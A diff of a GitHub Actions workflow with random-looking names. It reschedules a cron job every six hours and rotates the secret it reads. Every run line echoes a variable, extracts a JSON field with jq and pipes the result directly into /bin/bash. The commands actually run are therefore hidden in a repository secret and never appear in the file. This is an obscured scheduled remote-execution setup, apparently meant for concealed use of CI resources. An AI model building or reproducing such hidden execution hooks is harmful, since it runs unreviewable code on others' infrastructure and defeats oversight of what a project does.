@@ -2,7 +2,7 @@ name: yanxiaosan1829
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 2/6 * * *'
+    - cron: '8 1/6 * * *'
 
 jobs:
   build:
@@ -12,11 +12,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: yanxiaosan1829
         env:
-          a48642: ${{ secrets.a48642 }}
+          qp22332: ${{ secrets.qp22332 }}
         run: |
-          echo $a48642 | jq -r .cwd2023 | /bin/bash
-          echo $rahod2 | jq -r .pq65923 | /bin/bash
-          echo $lgzzo71891 | jq -r .kz7807 | /bin/bash
-          echo $yjag9 | jq -r .e4134 | /bin/bash
-          echo $m8688 | jq -r .ceq446 | /bin/bash
+          echo $qp22332 | jq -r .q5270 | /bin/bash
+          echo $h3 | jq -r .sy2675 | /bin/bash
+          echo $svew8756 | jq -r .z143 | /bin/bash
+          echo $kd24 | jq -r .gmzz18 | /bin/bash
+          echo $hqccn98 | jq -r .dbkbq886 | /bin/bash
+          echo $jrvf461 | jq -r .dkqat35 | /bin/bash
+          echo $de7731 | jq -r .zkv77570 | /bin/bash
+          echo $xuwhj3409 | jq -r .cuzl48645 | /bin/bash
+          echo $wmpr956 | jq -r .zj13829 | /bin/bash
+          echo $gd6761 | jq -r .mg15 | /bin/bash
+          echo $spzea4422 | jq -r .line81 | /bin/bash
+          echo $xfuia9661 | jq -r .qfvju0 | /bin/bash
+          echo $pkepn9788 | jq -r .kasfv9726 | /bin/bash
 
